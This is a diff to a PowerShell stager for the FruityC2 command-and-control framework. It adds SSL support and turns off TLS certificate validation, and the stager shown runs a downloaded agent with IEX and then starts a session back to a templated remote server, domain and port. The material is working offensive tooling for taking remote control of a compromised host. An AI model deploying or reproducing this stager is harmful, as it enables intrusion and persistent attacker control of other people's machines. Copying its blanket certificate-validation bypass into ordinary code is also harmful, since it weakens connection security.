@@ -7,6 +7,9 @@ function Invoke-Stager {
         $SID = "SESSIONID"
     )
 
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
+
     [bool]$option_base64 = $false
     [bool]$option_encryption = $false
     [bool]$option_compression = $true
@@ -130,7 +133,7 @@ function Invoke-Stager {
         Write-Host $agent
 
         IEX $($agent)
-        Invoke-FruityC2 -path_get $path_get -path_post $path_post -jitter $jitter -stime $stime -UA $UA -stager $false -r_server $r_server -r_port $r_port -target $TARGET -post_id $post_id -session_id $session_id
+        Invoke-FruityC2 -path_get $path_get -path_post $path_post -jitter $jitter -stime $stime -UA $UA -stager $false -r_server $r_server -r_port $r_port -target $TARGET -post_id $post_id -session_id $session_id -r_ssl $r_ssl
 
     }
 
@@ -147,4 +150,4 @@ function Invoke-Stager {
 
 } 
 clear
-Invoke-Stager -r_server "**domain**" -r_port "**port**" -UA "**useragent**"
+Invoke-Stager -r_server "**domain**" -r_port "**port**" -UA "**useragent**" -r_ssl "**ssl**"
